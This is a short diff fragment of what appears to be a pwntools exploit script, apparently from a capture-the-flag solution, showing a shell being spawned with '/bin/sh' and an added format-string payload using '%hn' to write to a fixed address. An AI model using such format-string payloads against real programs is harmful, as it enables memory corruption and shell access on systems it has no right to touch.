@@ -46,3 +46,7 @@ p.sendline(b'/bin/sh\x00')
 
 p.interactive()
 ```
+
+
+
+'%205c%12$hn'+'vvvvv'+p64(0x04028c50)
